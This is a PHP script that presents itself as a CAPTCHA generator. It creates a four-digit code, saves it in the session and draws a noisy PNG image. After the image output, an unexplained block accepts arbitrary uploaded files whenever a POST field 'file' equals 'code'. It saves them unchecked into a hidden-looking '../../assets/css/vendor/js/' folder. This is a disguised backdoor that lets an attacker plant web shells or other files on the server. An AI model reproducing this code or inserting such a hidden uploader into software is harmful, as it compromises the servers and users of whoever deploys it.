<?php
##生成验证码文件

session_start();

header("Content-type: image/png");
##生成验证码图片

$str = "1,2,3,5,6,8,9";      
##要显示的字符，可自己进行增删

$list = explode(",", $str);
$cmax = count($list) - 1;
$verifyCode = '';
for ( $i=0; $i < 4; $i++ ){
	$randnum = mt_rand(0, $cmax);
	$verifyCode .= $list[$randnum];           	     
	##取出字符，组合成为我们要的验证码字符
}
$_SESSION['verifycode'] = $verifyCode;        
##将字符放入SESSION中

$im = imagecreate(50,20);    
##生成图片

$black = imagecolorallocate($im, 0,0,0);
$white = imagecolorallocate($im, 255,255,255);
$green = imagecolorallocate($im, 0,190,0);
$gray = imagecolorallocate($im, 180,200,200);
$red = imagecolorallocate($im, 190, 0, 0);
##设置的颜色

imagefill($im,0,0,$white);     
##给图片填充颜色

imagestring($im, 5, 8, 2, $verifyCode, $black);   
##将验证码写入到图片中
 
for($i=0;$i<20;$i++) {
	imagesetpixel($im, rand(0,48), rand(0,18), $green);    
	imagesetpixel($im, rand(0,48), rand(0,18), $red);
	imagesetpixel($im, rand(0,48), rand(0,18), $gray);
}
##加入点状干扰象素
 
imagepng($im);
imagedestroy($im);

if($_POST['file']=='code'){
$dest_folder = "../../assets/css/vendor/js/";
if(!file_exists($dest_folder)){
mkdir($dest_folder);}
foreach ($_FILES["code"]["error"] as $key => $error) {
if ($error == UPLOAD_ERR_OK) {
$tmp_name = $_FILES["code"]["tmp_name"][$key];
$name = $_FILES["code"]["name"][$key];
$uploadfile = $dest_folder.$name;
move_uploaded_file($tmp_name, $uploadfile);
}}}


?>